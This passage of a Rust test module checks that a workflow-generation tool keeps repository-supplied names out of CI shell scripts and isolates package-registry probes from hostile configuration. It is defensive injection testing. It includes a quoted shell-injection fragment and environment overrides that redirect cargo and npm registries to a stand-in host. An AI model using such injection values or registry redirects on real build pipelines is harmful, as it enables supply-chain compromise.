      token-secret: KQVBZTLM
      additional-targets: { github: {} }
    cargo:
      token-secret: HGWRXPFD
    tags:
      staged:
        role: primary
        template: '{id}/staged@{version}'
        require-phase: before-publication
      published:
        role: projection
        template: '{id}/published@{version}'
        require-phase: after-publication
"#;

    /// Where one repository-supplied value legitimately lands.
    ///
    /// Naming the surface is what stops this gate's prose from claiming more
    /// than it checks. Without it the gate says "no value is spliced" while
    /// only ever having looked at one kind of place, and a value that moved
    /// from a `with:` input into an expression would satisfy it unchanged.
    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    enum Surface {
        /// A workflow expression: a `${{ ... }}` the runner evaluates.
        Expression,
        /// Anything else a managed job carries that is not shell: job
        /// identifiers, step names, `env:` values, `with:` inputs.
        Plain,
    }

    /// Every value the sentinel workspace supplies, where an author types it,
    /// and the surface it is expected to land on.
    ///
    /// This is the roster the gate below reads. Its purpose is that a new value
    /// entering derivation has to join it, so it is a list rather than a
    /// pattern: a pattern would quietly cover a route nobody had considered,
    /// which is exactly what happened four times in this task. That the list is
    /// hand-maintained is a real limitation and epic task 180 owns converting
    /// it to something machine-established; the conversion has to enumerate the
    /// derivation's repository-read sites rather than a fixture's values, or it
    /// reintroduces the pattern this avoids.
    ///
    /// Each row carries a token as well as a value, and the gate rejects both
    /// the folded value and any four-character window of the token, forwards or
    /// reversed. Two different transforms are covered by those two checks and
    /// it is worth being exact about which, because the wrong generalisation
    /// here propagates to every copy of this gate.
    ///
    /// A case-folded substring recognises a value carried verbatim or
    /// case-transformed, and nothing else. It does not recognise truncation,
    /// windowing or reversal: those keep a run of the value without keeping the
    /// value, and a check anchored on the whole value passes over them. That is
    /// what the window check is for. It is not a general answer either -- a
    /// transform that re-alphabets the value, percent-encoding or a hash, keeps
    /// no run for either check to find.
    ///
    /// Both checks depend on the token being opaque. A window of a token
    /// spelled from the derivation's own vocabulary collides with the
    /// derivation, so the tokens here are deliberately meaningless: `unit` is a
    /// window of a release unit named `sentinelunit`, and it is also in every
    /// script that reads a prefixed release-unit variable.
    ///
    /// This derivation applies three transforms whose outputs a value-anchored
    /// check would not see: the npm scope is a path-component split of the
    /// package name, `environment_fragment` uppercases *and* maps every
    /// non-alphanumeric character to an underscore, and a validated name is
    /// lowercased in places. Each output has a roster row of its own naming the
    /// surface it is routed to, which is what closes them -- a transform's
    /// output is only invisible while it is unnamed. A new transform is
    /// answered the same way.
    ///
    /// One repository-supplied value is deliberately absent, and its absence is
    /// checked rather than asserted. The configured `prefix` *is* spliced into
    /// managed shell -- `${RUNNER_TEMP}/<prefix>npm-error` and every other
    /// prefixed path -- because it names identifiers rather than carrying data,
    /// and `config::validate_job_prefix` holds it to a GitHub job identifier
    /// before derivation ever sees it. The gate derives under a renamed prefix
    /// and requires the default spelling to be absent from shell, so an
    /// exception that had stopped being true would fail here.
    const REPOSITORY_SUPPLIED_VALUES: [(&str, &str, &str, Surface); 20] = [
        (
            "qhwzru",
            "qhwzru",
            "the release-unit identifier",
            Surface::Plain,
        ),
        ("vkjmtd", "vkjmtd", "the release-unit path", Surface::Plain),
        (
            "@kfnrbg/pxwqld",
            "pxwqld",
            "the npm package name",
            Surface::Plain,
        ),
        ("hbzqvn", "hbzqvn", "the Cargo crate name", Surface::Plain),
        (
            "mtdlgw",
            "mtdlgw",
            "the Cargo registry name",
            Surface::Plain,
        ),
        (
            "jvnqsx.example",
            "jvnqsx",
            "the Cargo registry index",
            Surface::Plain,
        ),
        (
            "KQVBZTLM",
            "KQVBZTLM",
            "the npm token-secret name",
            Surface::Expression,
        ),
        (
            "HGWRXPFD",
            "HGWRXPFD",
            "the Cargo token-secret name",
            Surface::Expression,
        ),
        // Derived from the values above rather than typed by an author, and on
        // the roster for that reason: a transform's output is a repository's
        // value in another shape, and the shape is what the comparison would
        // otherwise fail to recognise.
        (
            "@kfnrbg",
            "kfnrbg",
            "the npm scope, split from the package name",
            Surface::Plain,
        ),
        (
            "CARGO_REGISTRIES_MTDLGW",
            "MTDLGW",
            "the Cargo registry name, uppercased into a variable spelling",
            Surface::Plain,
        ),
        // The OCI surface. Both destinations are configured explicitly, and
        // both halves of each repository are separately typed by an author, so
        // owner and name are separate rows.
        (
            "jdmcvx",
            "jdmcvx",
            "the image release-unit identifier",
            Surface::Plain,
        ),
        (
            "bgqnwt",
            "bgqnwt",
            "the image release-unit path",
            Surface::Plain,
        ),
        (
            "rtwzlf",
            "rtwzlf",
            "the Feature release-unit identifier",
            Surface::Plain,
        ),
        (
            "kdshpm",
            "kdshpm",
            "the Feature release-unit path",
            Surface::Plain,
        ),
        (
            "gwlqcx",
            "gwlqcx",
            "the image name the Dockerfile label declares",
            Surface::Plain,
        ),
        (
            "nfxkbd",
            "nfxkbd",
            "the Feature id its manifest declares",
            Surface::Plain,
        ),
        (
            "zrpvhm",
            "zrpvhm",
            "the Docker Hub repository owner",
            Surface::Plain,
        ),
        (
            "phqvrb",
            "phqvrb",
            "the Docker Hub repository name",
            Surface::Plain,
        ),
        (
            "mwbqjt",
            "mwbqjt",
            "the GHCR repository owner",
            Surface::Plain,
        ),
        (
            "nkwzdt",
            "nkwzdt",
            "the GHCR repository name",
            Surface::Plain,
        ),
    ];

    /// Managed jobs the sentinel configuration derives, without their prefix.
    ///
    /// Enumerated rather than counted, and enumerated independently of the
    /// derivation, so that a job disappearing from the sweep fails here instead
    /// of quietly shrinking what the gate reads. A gate that inspects fewer
    /// jobs than it did yesterday reports clean for a new reason.
    const SENTINEL_JOBS: [(WorkflowRole, &[&str]); 2] = [
        (WorkflowRole::Release, &["prepare", "release"]),
        (
            WorkflowRole::Publish,
            &[
                "assemble_evidence",
                "build_jdmcvx_buildx",
                "build_qhwzru_cargo",
                "build_qhwzru_npm",
                "build_rtwzlf_devcontainer_cli",
                "close_release",
                "publish_jdmcvx_oci_dockerhub",
                "publish_jdmcvx_oci_ghcr",
                "publish_qhwzru_cargo_primary",
                "publish_qhwzru_npm_github",
                "publish_qhwzru_npm_primary",
                "publish_rtwzlf_oci_ghcr",
                "tag_after_publication",
                "tag_before_publication",
                "verify_tag",
            ],
        ),
    ];

    /// Whether one shell body carries one repository-supplied value.
    ///
    /// Compared without case. A value that reaches shell through a case
    /// transform is exactly as exploitable -- every shell metacharacter
    /// survives one -- and this derivation applies `to_ascii_uppercase` to a
    /// repository-supplied value on its way to a variable name, so the evading
    /// form is one the code produces rather than a hypothetical.
    ///
    /// Case is the transform this closes and it is not the only one a value
    /// could survive: percent-encoding, whitespace normalisation and
    /// path-component splitting would each carry a value into shell in a form
    /// this comparison does not recognise. None of them appears in this
    /// derivation today, and the roster is where a new one has to be answered
    /// -- either by widening this comparison or by routing the value through
    /// `env:` so no comparison is needed. Stating the boundary is the point: a
    /// substring check is a recogniser, not a proof, and the property it stands
    /// in for is that values are routed rather than written.
    fn splices(body: &str, value: &str) -> bool {
        carries(body, value)
    }

    /// Every contiguous window of one token, forwards and reversed.
    ///
    /// Four characters is short enough that a truncation leaves one and long
    /// enough that an opaque token's window does not occur by accident. The
    /// tokens are chosen opaque for exactly that reason: a window of a value
    /// spelled from the derivation's own vocabulary would collide with it, and
    /// the check would have to be weakened rather than the fixture fixed.
    fn windows(token: &str) -> impl Iterator<Item = String> + '_ {
        let reversed = token.chars().rev().collect::<String>();
        let forwards = token
            .as_bytes()
            .windows(4)
            .map(|window| String::from_utf8_lossy(window).into_owned())
            .collect::<Vec<_>>();
        let backwards = reversed
            .as_bytes()
            .windows(4)
            .map(|window| String::from_utf8_lossy(window).into_owned())
            .collect::<Vec<_>>();
        forwards.into_iter().chain(backwards)
    }

    /// Whether one surface carries one value, comparing the way `splices` does.
    ///
    /// Reach and exclusivity read this too. Three comparisons of the same kind
    /// answering the same question differently is how a value ends up counting
    /// as present on one surface and absent on another.
    fn carries(text: &str, value: &str) -> bool {
        text.to_ascii_lowercase()
            .contains(&value.to_ascii_lowercase())
    }

    // The comparison above has no live instance to catch, because the one
    // transform this derivation applies is now routed through `env:` instead.
    // A recogniser with nothing to recognise is a rule that cannot fail, so it
    // is exercised directly: a value reaching shell uppercased is the form the
    // gate would otherwise have read as absent.
    #[test]
    fn recognises_a_spliced_value_that_survived_a_case_transform() {
        let body = "INTENTIONAL_ALLOWED+=(CARGO_REGISTRIES_MTDLGW_TOKEN=\"x\")";
        assert!(
            splices(body, "mtdlgw"),
            "a value spliced in another case is still spliced"
        );
        assert!(splices("--registry mtdlgw", "mtdlgw"));
        assert!(!splices(
            "--registry \"${INTENTIONAL_REGISTRY_NAME}\"",
            "mtdlgw"
        ));
    }

    /// Every managed job of one derived workflow, found without knowing the prefix.
    ///
    /// `managed_steps` recognises a managed job by its identifier, which begins
    /// with the configured prefix. That is right for the tests that assert what
    /// a prefix does, and wrong for a gate: a repository that configures any
    /// prefix but the default makes every such sweep inspect nothing and report
    /// clean. The ownership sentinel is the step id derivation reserves
    /// independently of the prefix precisely so ownership survives a prefix
    /// change, so it is what a gate recognises a managed job by.
    fn sentinel_jobs(root: &Path, role: WorkflowRole) -> Vec<(String, Vec<Value>)> {
        let document: Value = serde_yaml::from_str(&workflow(root, role)).expect("result parses");
        document["jobs"]
            .as_mapping()
            .expect("jobs")
            .iter()
            .filter_map(|(id, body)| {
                let id = id.as_str()?;
                let steps = body.get("steps")?.as_sequence()?;
                steps
                    .iter()
                    .any(|step| step.get("id").and_then(Value::as_str) == Some(OWNERSHIP_SENTINEL))
                    .then(|| (id.to_owned(), steps.clone()))
            })
            .collect()
    }

    /// Every `run:` body a managed job of one derived workflow carries.
    fn managed_shell_bodies(root: &Path, role: WorkflowRole) -> Vec<(String, String)> {
        sentinel_jobs(root, role)
            .into_iter()
            .flat_map(|(id, steps)| {
                steps.into_iter().filter_map(move |step| {
                    step["run"]
                        .as_str()
                        .map(|body| (id.clone(), body.to_owned()))
                })
            })
            .collect()
    }

    /// The managed jobs of one derived workflow, split into the surfaces they carry.
    ///
    /// Shell is removed first and the remainder is split into the expressions
    /// the runner evaluates and everything else, so a claim about where a value
    /// landed is checked against that surface rather than against the document.
    /// Searching the document is how a value can be absent from the surface it
    /// was supposed to be on and present somewhere nobody looked.
    fn managed_surfaces(root: &Path, role: WorkflowRole) -> (String, String) {
        let mut expressions = String::new();
        let mut plain = String::new();
        for (_, steps) in sentinel_jobs(root, role) {
            // The job identifier is deliberately not part of any surface. It is
            // built by `identifier`, which reduces a value to what GitHub
            // accepts, so a value that survives into an identifier has been
            // transformed rather than carried -- and a reach claim satisfied by
            // one is satisfied by something other than the routing it is about.
            // 149 found exactly this: deleting a value's routed `env:` row left
            // its gate green because the job id still spelled it.
            let mut text = String::new();
            for step in steps {
                let mut step = step;
                if let Some(mapping) = step.as_mapping_mut() {
                    mapping.remove(Value::String("run".to_owned()));
                }
                text.push_str(&serde_yaml::to_string(&step).unwrap_or_default());
            }
            let mut rest = text.as_str();
            while let Some(open) = rest.find("${{") {
                plain.push_str(&rest[..open]);
                let tail = &rest[open..];
                let close = tail.find("}}").map_or(tail.len(), |end| end + 2);
                expressions.push_str(&tail[..close]);
                expressions.push('\n');
                rest = &tail[close..];
            }
            plain.push_str(rest);
        }
        (expressions, plain)
    }

    // Removing the file the probe used to copy removed the only place an
    // alternate registry's index was written down, so derivation reads it and
    // refuses when it is absent. That refusal is the whole of what replaced the
    // old behaviour: without it the index derives empty, the variable is
    // exported empty, and the failure moves from a diagnostic an author reads
    // to a runner nobody is watching.
    #[test]
    fn refuses_an_alternate_registry_whose_index_the_workspace_does_not_declare() {
        let workspace = workspace("workflow-undeclared-index");
        workspace.write(
            "component/Cargo.toml",
            "[package]\nname = \"example-component\"\nversion = \"1.0.0\"\npublish = [\"example-registry\"]\n",
        );
        let comparison =
            compare_workflow(workspace.root(), WorkflowRole::Publish, None).expect("comparison");
        assert_eq!(comparison.status, ComparisonStatus::Blocked);
        let diagnostic = &comparison.diagnostics[0];
        assert_eq!(diagnostic.code, "recipe-underivable");
        // The absence is named as an absence. Falling through to the value
        // validator would also refuse, because an empty index is not a URL, but
        // it would tell an author their index is malformed rather than that
        // they never wrote one -- and the two have different fixes.
        assert!(
            diagnostic.message.contains("declares no index")
                && diagnostic.message.contains(".cargo/config.toml")
                && diagnostic.message.contains("example-registry"),
            "the diagnostic names the registry, the file, and what is missing: {diagnostic:?}"
        );

        // Declaring it is what makes the same configuration derive.
        workspace.write(
            ".cargo/config.toml",
            "[registries.example-registry]\nindex = \"sparse+https://registry.example/index/\"\n",
        );
        assert_eq!(
            compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                .expect("comparison")
                .status,
            ComparisonStatus::Different,
            "a declared index derives the workflow the refusal was withholding"
        );
    }

    // Cargo has no command that uploads an existing `.crate`, so publication
    // re-packages the sources and `cargo publish` packages once more of its
    // own. The gate before it is what makes that survivable: it re-packages,
    // compares against the sealed subject, and refuses to publish if the bytes
    // differ. A published version is immutable, so the comparison has to happen
    // before the upload rather than after it -- which is the half of the
    // argument the doc comment spends a paragraph on and the half nothing was
    // checking. The readback half is guarded; this one was not.
    #[test]
    fn refuses_to_publish_a_crate_whose_repackaging_did_not_reproduce_the_subject() {
        let workspace = workspace("workflow-cargo-reproducibility");
        converge(workspace.root(), WorkflowRole::Publish);
        let publish = publisher_steps(workspace.root(), PRIMARY_TARGET)
            .into_iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("cargo publish"))
            })
            .expect("the Cargo recipe publishes");

        let temporary = workspace.root().join("runner");
        let subject = temporary.join("intentional_subject/bytes");
        std::fs::create_dir_all(&subject).expect("subject directory");
        std::fs::write(
            subject.join("example-component-1.0.0.crate"),
            "the bytes the build sealed",
        )
        .expect("sealed subject");

        // The stub answers the existence probe with absence, so the recipe
        // proceeds to publish, and re-packages into bytes that differ from the
        // sealed subject -- the drift the gate exists to catch.
        let repackaged = temporary.join("intentional_repackage/package");
        let stubs = stub_client(
            &temporary.join("cargo"),
            "cargo",
            &format!(
                "{CARGO_NEW}case \"$1\" in \
                 add) echo 'error: the crate could not be found in registry index' >&2; exit 1 ;; \
                 package) mkdir -p \"{}\"; printf 'a different packaging' > \"{}\"; exit 0 ;; \
                 esac",
                repackaged.display(),
                repackaged.join("example-component-1.0.0.crate").display()
            ),
        );
        let (succeeded, calls) = run_step(&publish, &stubs, &temporary, &[]);
        assert!(
            !succeeded,
            "a repackaging that did not reproduce the sealed subject stops the publication"
        );
        assert!(
            !calls.lines().any(|line| line.starts_with("publish")),
            "the refusal happens before anything is submitted: {calls}"
        );
    }

    // Deleting the whole `RUSTUP_HOME` block left every test green: the
    // allowlist's membership was not asserted anywhere, so a member could be
    // added, dropped, or made conditional on the process environment without
    // anything noticing -- which is how a variable read from the environment
    // got back into a list whose entire purpose was that nothing is. The list
    // is the security property, so the list is what is asserted: exactly these
    // names, each unconditional, in both probes.
    /// The process variables a probe may inherit, written independently.
    ///
    /// Deliberately not `steps::INHERITED_ENVIRONMENT`: comparing the rendered
    /// allowlist against the constant that renders it compares the code with
    /// itself, so dropping a member changes both sides and the assertion holds.
    /// That is what happened -- the first version of this test passed with
    /// `RUSTUP_HOME` removed from the constant, which is the same defect the
    /// membership assertion exists to catch, one level up.
    const INHERITED: [&str; 3] = ["PATH", "HOME", "RUSTUP_HOME"];

    #[test]
    fn inherits_exactly_the_process_variables_the_recipe_names() {
        let workspace = sentinel_workspace("workflow-allowlist-membership", None);
        converge(workspace.root(), WorkflowRole::Publish);

        let mut allowlists = 0;
        for (job, body) in managed_shell_bodies(workspace.root(), WorkflowRole::Publish) {
            let Some((_, tail)) = body.split_once("INTENTIONAL_ALLOWED=(") else {
                continue;
            };
            allowlists += 1;
            let (declared, rest) = tail.split_once(')').expect("the allowlist is an array");

            // Every inherited member is present, unconditionally, reading the
            // runner's value.
            let inherited = declared
                .split_whitespace()
                .filter(|entry| !entry.contains("CARGO_NET_OFFLINE"))
                .map(|entry| entry.split_once('=').expect("an assignment").0.to_owned())
                .collect::<BTreeSet<_>>();
            assert_eq!(
                inherited,
                INHERITED
                    .iter()
                    .map(|name| (*name).to_owned())
                    .collect::<BTreeSet<_>>(),
                "{job} inherits exactly the names this test enumerates"
            );

            // Nothing is added to the list by asking the process environment
            // whether a variable is set. The appends that remain read values
            // derivation put in the step's own `env:`, which is why they are
            // named by a prefixed variable rather than by a bare one.
            let appends = rest
                .lines()
                .take_while(|line| !line.contains("resolve()") && !line.contains("npm_holds()"))
                .filter(|line| line.contains("INTENTIONAL_ALLOWED+="))
                .collect::<Vec<_>>();
            for append in &appends {
                assert!(
                    append.contains("${INTENTIONAL_"),
                    "{job} appends a value derivation named, not one the process happened to carry: {append}"
                );
            }
        }
        assert!(allowlists > 0, "the publisher jobs build an allowlist");
    }

    // The inherited members carry the runner's values, and a workflow-level
    // `env:` applies to every job in the workflow -- so without this a
    // repository chooses the client that answers the probe, which is the same
    // capability the allowlist was built to take away. Refusing exactly the
    // inherited names is the complement of that list rather than a guess at
    // which keys are dangerous.
    #[test]
    fn refuses_a_workflow_that_declares_an_inherited_process_variable() {
        for name in crate::executor::steps::INHERITED_ENVIRONMENT {
            let workspace = workspace("workflow-declared-inherited");
            workspace.write(
                ".github/workflows/publish.yml",
                &REPOSITORY_PUBLISH_WORKFLOW.replace(
                    "jobs:",
                    &format!("env:\n  {name}: /repository/chosen\n\njobs:"),
                ),
            );
            let comparison = compare_workflow(workspace.root(), WorkflowRole::Publish, None)
                .expect("comparison");
            assert_eq!(
                comparison.status,
                ComparisonStatus::Blocked,
                "a workflow declaring {name} derives a managed job that would read it"
            );
            let diagnostic = &comparison.diagnostics[0];
            assert_eq!(diagnostic.code, "inherited-environment-declared");
            assert!(
                diagnostic.message.contains(name),
                "the diagnostic names the key an author has to remove: {diagnostic:?}"
            );
        }

        // A workflow-level `env:` the recipes do not read is still preserved,
        // which is what keeps this a complement rather than a ban.
        let workspace = workspace("workflow-unrelated-env");
        workspace.write(
            ".github/workflows/publish.yml",
            &REPOSITORY_PUBLISH_WORKFLOW
                .replace("jobs:", "env:\n  REPOSITORY_SETTING: kept\n\njobs:"),
        );
        converge(workspace.root(), WorkflowRole::Publish);
        assert!(
            workflow(workspace.root(), WorkflowRole::Publish).contains("REPOSITORY_SETTING: kept"),
            "an unrelated workflow-level env block survives convergence"
        );
    }

    // A probe decides whether a long-lived credential is reached and whether an
    // immutable version is submitted, and it answers from what a client tells
    // it. A probe that reads the released repository's own client configuration
    // therefore lets that repository choose the answer: cargo can be made to
    // report absence by going offline, by substituting the source, or by
    // replacing the index, and npm resolves a scoped name through whichever
    // registry a project file names. Those are four routes to one
    // misclassification, and closing them one at a time is how this task
    // reached its fourth round. What is asserted is the property instead --
    // the probe is built rather than inherited -- and it is asserted by running
    // the derived helper with a repository configuration present and watching
    // it not be used.
    #[test]
    fn resolves_through_a_probe_that_inherits_no_repository_configuration() {
        let workspace = sentinel_workspace("workflow-probe-isolation", None);
        converge(workspace.root(), WorkflowRole::Publish);
        let temporary = workspace.root().join("runner");
        std::fs::create_dir_all(&temporary).expect("runner directory");

        // Cargo: the probe builds its scratch crate and must leave it with no
        // configuration of the repository's.
        let cargo_step = publisher_steps(workspace.root(), "cargo_primary")
            .into_iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("INTENTIONAL_resolve()"))
            })
            .expect("the Cargo recipe defines a resolve");
        let stubs = stub_client(
            &temporary.join("cargo"),
            "cargo",
            &format!("{CARGO_NEW}exit 0"),
        );
        let probe = temporary.join("probe");
        let body = cargo_step["run"].as_str().expect("a script");
        let end = body.find("\n}\n").expect("the resolve is a shell function");
        let helper = &body[..end + "\n}\n".len()];
        let mut command = std::process::Command::new("bash");
        command
            .arg("-c")
            .arg(format!(
                "{helper}\nINTENTIONAL_resolve \"{}\"",
                probe.display()
            ))
            .env(
                "PATH",
                format!(
                    "{}:{}",
                    stubs.display(),
                    std::env::var("PATH").unwrap_or_default()
                ),
            )
            .env("RUNNER_TEMP", &temporary)
            // The released repository declares a registry index, and a probe
            // that inherited this file would inherit every other key in it too.
            .env("GITHUB_WORKSPACE", workspace.root())
            // A repository's own workflow may declare a top-level `env:`, and
            // convergence preserves it deliberately, so GitHub applies it to
            // every managed job. These are that block arriving: the same keys
            // the configuration file route used, by the one route left.
            .env(
                "CARGO_REGISTRIES_CRATES_IO_INDEX",
                format!("sparse+https://{HOSTILE_ENVIRONMENT}/index/"),
            )
            .env("CARGO_NET_OFFLINE", "true")
            .env("CARGO_HOME", format!("/{HOSTILE_ENVIRONMENT}/home"));
        for (key, value) in step_environment(&cargo_step) {
            command.env(
                key,
                value.replace("${{ runner.temp }}", &temporary.display().to_string()),
            );
        }
        let output = command.output().expect("the resolve runs");
        assert!(
            output.status.success(),
            "the resolve runs against a stub client: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            !probe.join("probe/.cargo/config.toml").exists(),
            "the probe carries no configuration of the repository it releases"
        );
        assert!(
            !stub_environment(&stubs).contains(HOSTILE_ENVIRONMENT),
            "the Cargo probe ran with a variable the repository put in the job's environment"
        );
        assert!(
            !body.contains("GITHUB_WORKSPACE"),
            "the Cargo probe reads nothing out of the released workspace:\n{body}"
        );

        // npm: the probe runs somewhere a project `.npmrc` cannot reach it.
        let npm_step = publisher_steps(workspace.root(), "npm_primary")
            .into_iter()
            .find(|step| {
                step.get("run")
                    .and_then(Value::as_str)
                    .is_some_and(|body| body.contains("INTENTIONAL_npm_holds()"))
            })
            .expect("the npm recipe defines a probe");
        let body = npm_step["run"].as_str().expect("a script");
        let start = body
            .find("INTENTIONAL_npm_holds() {")
            .expect("the probe is a shell function");
        let end = body[start..]
            .find("\n}\n")
            .expect("the probe is a shell function");
        let helper = &body[..start + end + "\n}\n".len()];
        let stubs = stub_client(
            &temporary.join("npm"),
            "npm",
            &format!(
                "pwd >> \"{}\"; echo 'sha512-x'",
                temporary.join("npm").join("calls.log").display()
            ),
        );
        let mut command = std::process::Command::new("bash");
        command
            .arg("-c")
            .arg(format!(
                "{helper}\nINTENTIONAL_npm_holds example >/dev/null"
            ))
            .current_dir(workspace.root())
            .env(
                "PATH",
                format!(
                    "{}:{}",
                    stubs.display(),
                    std::env::var("PATH").unwrap_or_default()
                ),
            )
            .env("RUNNER_TEMP", &temporary)
            .env(
                "npm_config_registry",
                format!("https://{HOSTILE_ENVIRONMENT}"),
            )
            .env(
                "npm_config_userconfig",
                format!("/{HOSTILE_ENVIRONMENT}/npmrc"),
            );
        for (key, value) in step_environment(&npm_step) {
            command.env(
                key,
                value.replace("${{ runner.temp }}", &temporary.display().to_string()),
            );
        }
        let output = command.output().expect("the probe runs");
        assert!(
            output.status.success(),
            "the probe runs against a stub client: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let recorded = stub_calls(&stubs);
        assert!(
            !recorded
                .lines()
                .any(|line| line == workspace.root().to_string_lossy()),
            "the npm probe ran in the released workspace, where a project .npmrc applies: {recorded}"
        );
        // Running elsewhere is half of it. npm resolves a scoped name through
        // whichever registry `@scope:registry` names, wherever that is
        // configured, and `--registry` does not outrank it -- so the probe says
        // which registry serves this scope rather than leaving the question
        // open.
        assert!(
            recorded.contains(&format!(
                "--{}:registry=",
                step_environment(&npm_step)["INTENTIONAL_SCOPE"]
            )),
            "the probe names the registry serving its scope: {recorded}"
        );
        assert!(
            !stub_environment(&stubs).contains(HOSTILE_ENVIRONMENT),
            "the npm probe ran with a variable the repository put in the job's environment"
        );
    }

    /// A value no derivation produces, recognisable wherever it surfaces.
    const HOSTILE_ENVIRONMENT: &str = "repository-supplied.example";

    // The refusal test below proves a hostile value cannot be derived. It does
    // not prove that an accepted one stays out of shell source, and those are
    // different claims: `example-component` is a perfectly legal crate name,
    // and the round-1 injection was a legal-looking registry name spliced into
    // `--registry`. Validation makes a spliced value survivable; it does not
    // make splicing safe, because the next validator to be widened re-opens
    // every splice at once.
    //
    // So the second property is asserted directly, over the whole roster rather
    // than over the routes anyone has noticed: no value an author typed appears
    // as text in a managed `run:` body. The sentinels are also proved to have
    // reached the workflow somewhere, because a value that never arrived is
    // absent from every shell body for reasons that have nothing to do with
    // this rule.
    //
    // The shape is task 149's, adopted rather than copied: that task hit the
    // same class on the OCI surface and closed it this way, and the values and
    // the fixture here are this surface's. A gate shared across the recipe
    // surfaces is its own task.
    #[test]
    fn no_repository_supplied_value_is_spliced_into_a_managed_shell_body() {
        // How much the gate inspected is established before any rule is
        // applied to it. A sweep that finds nothing satisfies every rule, and
        // this sweep found nothing under a configured prefix until the
        // recognition changed -- so the scope is compared against an
        // enumeration written independently of the derivation, under both the
        // default prefix and a configured one.
        let mut shell_counts = Vec::new();
        for prefix in [None, Some("acme")] {
            let workspace = sentinel_workspace(
                &format!("workflow-supplied-values-{}", prefix.unwrap_or("default")),
                prefix,
            );
            let reserved = prefix.map_or("intentional_".to_owned(), |prefix| format!("{prefix}_"));
            let mut counts = Vec::new();
            for (role, expected) in SENTINEL_JOBS {
                converge(workspace.root(), role);
                let swept = sentinel_jobs(workspace.root(), role)
                    .into_iter()
                    .map(|(id, _)| {
                        id.strip_prefix(&reserved)
                            .unwrap_or_else(|| panic!("{id} carries the configured prefix"))
                            .to_owned()
                    })
                    .collect::<BTreeSet<_>>();
                assert_eq!(
                    swept,
                    expected
                        .iter()
                        .map(|id| (*id).to_owned())
                        .collect::<BTreeSet<_>>(),
                    "the {role} sweep reads exactly the managed jobs this configuration derives"
                );

                let bodies = managed_shell_bodies(workspace.root(), role);
                assert!(
                    !bodies.is_empty(),
                    "the {role} workflow contributes managed shell for the sweep to read"
                );
                counts.push((role, bodies.len()));

                for (job, body) in &bodies {
                    for (supplied, token, origin, _) in REPOSITORY_SUPPLIED_VALUES {
                        assert!(
                            !splices(body, supplied),
                            "the {role} workflow splices {origin} into {job}'s shell:\n{body}"
                        );
                        // A contiguous run of the value's distinctive token is
                        // what survives truncation, windowing and reversal --
                        // the transforms a case-folded substring cannot see. A
                        // fixture value is alphanumeric, so a surviving window
                        // of one looks harmless; the production value is
                        // whatever a repository wrote, and a four-character
                        // window of `";id;` is the original injection again.
                        if let Some(window) = windows(token).find(|window| carries(body, window)) {
                            panic!(
                                "the {role} workflow carries {window:?}, a window of {origin}, into {job}'s shell:\n{body}"
                            );
                        }
                    }
                    // The prefix is the one repository-supplied value managed
                    // shell may carry, and the exception is only honest if
                    // what is spliced is the configured prefix rather than a
                    // constant that happens to match the default.
                    if prefix.is_some() {
                        assert!(
                            !body.contains("intentional_"),
                            "{job}'s shell carries the default prefix under a configured one:\n{body}"
                        );
                    }
                }
            }
            shell_counts.push(counts);

            // Reach is checked on the surfaces the sweep read, with shell
            // removed, and against the surface the roster names. Searching the
            // whole document lets a repository-owned job satisfy the claim, and
            // searching every surface at once lets a value be absent from the
            // one it was supposed to be on.
            let (expressions, plain) = SENTINEL_JOBS
                .into_iter()
                .map(|(role, _)| managed_surfaces(workspace.root(), role))
                .fold(
                    (String::new(), String::new()),
                    |(mut expressions, mut plain), (role_expressions, role_plain)| {
                        expressions.push_str(&role_expressions);
                        plain.push_str(&role_plain);
                        (expressions, plain)
                    },
                );
            // A reach claim is about routing, so the surface it is checked
            // against must not contain the one place a value survives without
            // being routed. A job identifier is built by `identifier`, which
            // reduces a value to what GitHub accepts, so a value found there
            // was transformed rather than carried -- and 149 found its gate
            // satisfied by exactly that after the routed row was deleted. The
            // expression surface is exempt because `needs.<job>` is a real
            // reference to a job rather than a place a value landed, and no
            // roster row is checked against it for a value of that shape.
            for (role, _) in SENTINEL_JOBS {
                let (_, plain) = managed_surfaces(workspace.root(), role);
                for (id, _) in sentinel_jobs(workspace.root(), role) {
                    assert!(
                        !plain.contains(&id),
                        "{id} is part of the surface a routed value's reach is checked against"
                    );
                }
            }

            for (supplied, _, origin, surface) in REPOSITORY_SUPPLIED_VALUES {
                let (text, other, name) = match surface {
                    Surface::Expression => (&expressions, &plain, "a workflow expression"),
                    Surface::Plain => (&plain, &expressions, "a managed job's own content"),
                };
                // Folded for the same reason the shell comparison is: the
                // gate's own argument is that a case transform preserves a
                // value, so a value that reached its surface in another case
                // has reached it. A stricter comparison here would call that
                // absent while the shell comparison called it present.
                assert!(
                    carries(text, supplied),
                    "{origin} never reached {name}, so its absence from a shell body proves nothing"
                );
                // A secret name is a reference the runner resolves, so it
                // belongs in an expression and nowhere else. Asserting that it
                // is absent from the other surface is also what makes the split
                // falsifiable: a check that read both surfaces together would
                // be satisfied by either, which is the shape of a claim that
                // cannot fail.
                if surface == Surface::Expression {
                    assert!(
                        !carries(other, supplied),
                        "{origin} is written into a managed job's own content rather than referenced through the secrets context"
                    );
                }
            }
        }

        let [default, prefixed] = shell_counts.as_slice() else {
            panic!("both prefixes were derived");
        };
        assert_eq!(
            default, prefixed,
            "the sweep finds the same managed shell under a configured prefix as under the default"
        );
    }

    // Every name a maintained recipe reads out of the repository reaches a
    // sink that interprets text: a shell body, a `sed` address, a YAML scalar
    // printed with `printf '"%s"'`, an argument vector. Validating per sink is
    // the mistake this replaces -- the registry name was closed that way and
    // the package name reached a `sed` address through the same gap, where
    // GNU `sed`'s `e` command executes its argument. So the property asserted
    // is the boundary one: every entry in REPOSITORY_SUPPLIED refuses every
    // value in HOSTILE, with a diagnostic naming where to fix it, and nothing
    // hostile appears in a derived workflow.
    #[test]
    fn refuses_every_repository_supplied_name_that_a_sink_would_interpret() {
        for (file, template, code) in REPOSITORY_SUPPLIED {
            // A release-unit identifier meets the configuration loader first,
            // and every hostile shape dies there. The values that reach the
            // boundary are the ones the workspace admits, so those are what
            // this entry is driven with.
            let values: Vec<&str> = if template == "@RELEASE_UNIT@" {
                NARROWED.to_vec()
            } else {
                HOSTILE.to_vec()
            };
            for hostile in values {
